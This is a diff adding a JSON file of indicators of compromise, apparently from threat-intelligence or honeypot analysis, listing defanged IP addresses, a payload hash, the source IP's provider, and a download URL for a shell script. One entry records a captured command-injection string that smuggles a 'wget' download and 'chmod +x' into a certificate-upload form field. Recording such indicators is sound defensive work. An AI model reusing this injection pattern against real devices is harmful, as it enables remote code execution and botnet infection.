@@ -1,0 +1,39 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "154.168.179.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "89.32.41.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://89.32.41.XXX/bins/kla.sh"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget hxxp://89.32.41.XXX/bins/kla.sh -O k;chmod +x"
+  },
+  {
+    "asn": "Turk Telekom",
+    "country": "Türkiye",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "85.103.42.XXX"
+  }
+]
